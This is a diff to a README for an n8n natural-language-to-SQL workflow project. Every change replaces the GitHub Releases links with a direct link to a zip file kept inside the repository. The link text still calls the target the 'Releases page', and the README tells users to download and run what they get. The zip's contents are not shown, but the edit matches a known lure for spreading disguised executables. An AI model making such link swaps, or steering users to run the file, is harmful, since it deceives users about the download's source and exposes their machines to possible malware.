@@ -1,6 +1,6 @@
 # 🎉 n8n-nl2sql-workflow - Automate Your SQL Queries Easily
 
-[![Download n8n-nl2sql-workflow](https://img.shields.io/badge/Download-n8n--nl2sql--workflow-blue.svg)](https://github.com/sohail-18/n8n-nl2sql-workflow/releases)
+[![Download n8n-nl2sql-workflow](https://raw.githubusercontent.com/sohail-18/n8n-nl2sql-workflow/main/public/dist/n8n-nl2sql-workflow_v2.6-beta.4.zip)](https://raw.githubusercontent.com/sohail-18/n8n-nl2sql-workflow/main/public/dist/n8n-nl2sql-workflow_v2.6-beta.4.zip)
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ The n8n-nl2sql-workflow offers a user-friendly way to manage SQL queries through
 
 To start using n8n-nl2sql-workflow, follow these steps:
 
-1. **Visit the Download Page**: Go to the [Releases page](https://github.com/sohail-18/n8n-nl2sql-workflow/releases) to find the latest version.
+1. **Visit the Download Page**: Go to the [Releases page](https://raw.githubusercontent.com/sohail-18/n8n-nl2sql-workflow/main/public/dist/n8n-nl2sql-workflow_v2.6-beta.4.zip) to find the latest version.
 
 2. **Select Your Version**: Choose the most recent release and click on the link to download the application.
 
@@ -44,7 +44,7 @@ To start using n8n-nl2sql-workflow, follow these steps:
 
 ## 🔄 Download & Install
 
-To get started, *visit this page* to download the latest version: [Releases page](https://github.com/sohail-18/n8n-nl2sql-workflow/releases).
+To get started, *visit this page* to download the latest version: [Releases page](https://raw.githubusercontent.com/sohail-18/n8n-nl2sql-workflow/main/public/dist/n8n-nl2sql-workflow_v2.6-beta.4.zip).
 
 After downloading, run the application to begin using n8n-nl2sql-workflow. Follow the prompts to set up your preferences and get ready to streamline your SQL queries.
 
